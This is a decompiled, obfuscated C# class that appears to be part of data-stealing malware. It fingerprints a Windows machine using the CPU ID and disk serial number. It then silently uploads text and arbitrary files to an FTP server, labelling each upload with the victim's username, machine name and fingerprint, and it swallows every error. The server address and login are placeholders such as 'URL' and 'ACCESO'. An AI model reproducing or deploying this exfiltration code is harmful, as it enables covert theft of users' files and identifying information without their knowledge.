using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace LSMgrTguKYchoUzfqQ;

internal sealed class TZtvpaeBArDn
{
	public static string SYUDBfQBjCH()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = "C";
		ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		return text3 + text;
	}

	public static void YtMLGIsTHQvw(string yvReaPwhmkugp = "URL", string hVJDSWCHKqDqslz = "USERNAME", string nJmtIKOgdSJ = "ACCESO", string srAWQSDZDenUMf = "")
	{
		try
		{
			string text = SYUDBfQBjCH();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(yvReaPwhmkugp + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(hVJDSWCHKqDqslz, nJmtIKOgdSJ);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(srAWQSDZDenUMf);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void OZyIhSfVXkqPJk(string MXUqGQXldEc = "URL", string VxBndAUPQtVo = "USERNAME", string kTGjxAiDzwuQR = "ACCESO", string jbRoPTxvZvZJE = "")
	{
		try
		{
			string text = SYUDBfQBjCH();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(MXUqGQXldEc + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + "_" + Path.GetFileName(jbRoPTxvZvZJE));
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(VxBndAUPQtVo, kTGjxAiDzwuQR);
			byte[] array = File.ReadAllBytes(jbRoPTxvZvZJE);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}
}
